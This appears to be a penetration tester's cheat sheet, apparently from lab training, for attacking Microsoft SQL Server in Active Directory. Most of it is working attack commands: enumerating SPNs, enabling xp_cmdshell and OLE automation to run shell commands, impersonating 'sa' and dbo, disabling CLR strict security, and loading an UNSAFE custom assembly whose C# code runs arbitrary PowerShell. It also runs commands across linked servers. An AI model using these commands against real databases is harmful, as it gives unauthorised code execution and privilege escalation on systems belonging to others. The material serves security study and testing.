# Enumeration

### Enumerate AD for SPN's with built in setspn

``` Powershell
setspn -T corp1 -Q MSSQLSvc/*
```



### enumerate AD for SPNS with getUserSPNs.ps1

``` powershell
.\getUserSPNS.ps1
```

<br><br>

# Authentication with C#

### Powershell check connection 

```powershell
$connectionString = "Server=dc01;database=master;Integrated Security=True"; $sqlconn = [System.Data.SqlClient.SqlConnection]::new($connectionString); $sqlconn.Open(); $sqlCommand = [System.Data.SqlClient.SqlCommand]::new("SELECT USER_NAME()", $sqlconn); $sqldatareader = $sqlCommand.ExecuteReader(); while ($sqldatareader.Read()) { Write-Host $sqldatareader[0] }
```

SAME COMMAND AS ABOVE BUT ABLE TO READ STACKED QUERIES

```powershell
$connectionString = "Server=sql05;database=msdb;Integrated Security=True"; $sqlconn = [System.Data.SqlClient.SqlConnection]::new($connectionString); $sqlconn.Open(); $sqlCommand = [System.Data.SqlClient.SqlCommand]::new("SELECT USER_NAME(); SELECT SYSTEM_USER", $sqlconn); $sqldatareader = $sqlCommand.ExecuteReader(); do { while ($sqldatareader.Read()) { Write-Host $sqldatareader[0] } } while ($sqldatareader.NextResult())
```

### C# executable created called SQLHELPER


<img width="1367" height="312" alt="image" src="https://github.com/user-attachments/assets/df9f412a-b6c9-47b1-ac19-6e4ad0a580c6" />

<br><br>




## Command execution via xp_cmdshell or sp_oacreate/sp_oamethod

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell whoami;
```

asuser
```sql
use msdb; EXECUTE AS USER = 'dbo'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{0}\"';
```

aslogin
```sql
EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{0}\"'"
```

<br><br>

## Custom assemblies 

**If a database has the TRUSTWORTHY property set, it's possible to use the CREATE ASSEMBLY statement to import a managed DLL as an object inside the SQL server and execute methods within it**

Query to find trust_worthy databases
```sql
SELECT name AS DatabaseName, suser_name(owner_sid) AS OwnerName, is_trustworthy_on AS IsTrustworthyOn FROM sys.databases WHERE HAS_DBACCESS(name) = 1 AND is_trustworthy_on = 1 ORDER BY name;
```

Creating a stored procedure from an assembly is not allowed by default. This is controlled through the CLR Integration setting, which is disabled by default. Luckily, we can enable it using sp_configure and the clr enabled option.

Beginning with Microsoft SQL Server 2017, there is an additional security mitigation called CLR strict security. This mitigation only allows signed assemblies by default. CLR strict security can also be disabled through sp_configure with the clr strict security option.

In summary, we must execute the SQL statements shown below before we start creating the stored procedure from an assembly.


``` sql
EXEC sp_configure 'show advanced options',1
RECONFIGURE

EXEC sp_configure 'clr enabled',1
RECONFIGURE

EXEC sp_configure 'clr strict security', 0
RECONFIGURE
```


```sql
EXEC sp_configure 'show advanced options',1
; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0
; RECONFIGURE; CREATE ASSEMBLY myAssembly FROM 'c:\tools\StoredProcedure.dll' WITH PERMISSION_SET = UNSAFE; CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec]; EXEC cmdExec 'whoami'
```
<br>

Powershell script to make a managed DLL into a hex string

```powershell
$assemblyFile = "\\192.168.119.120\visualstudio\Sql\cmdExec\bin\x64\Release\cmdExec.dll"
$stringBuilder = New-Object -Type System.Text.StringBuilder 

$fileStream = [IO.File]::OpenRead($assemblyFile)
while (($byte = $fileStream.ReadByte()) -gt -1) {
    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
}
$stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt
```


### Pass the hex encoded DLL file in the create assembly query to smuggle exe and achieve RCE.

Example managed DLL file
```C#
using Microsoft.SqlServer.Server;
using System;
using System.Collections.Generic;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

public class StoredProcedure
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmdExec(SqlString execCommand)
    {
        // TODO

        Process proc = new Process();
        proc.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
        proc.StartInfo.Arguments = String.Format("-Command {0}",execCommand);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();


        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();

        proc.WaitForExit();
        proc.Close();
    }
}

```

<br><br>
# Linked SQL servers

The sp_linkedservers stored procedure returns a list of linked servers for us.
Use OPENQUERY OR AT 

List linked servers if RPC out is enabled.
```sql
SELECT sp_linkedservers; 
```

List linked servers
```sql
EXEC sp_helpserver
```

Execute queries across linked SQL servers.  The command below executes commands against DC01.

```sql
select version from openquery("dc01", 'select @@version as version')
```


AT Keyword in queries to run query in another server

```sql
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT DC01, $sqlconn)
```
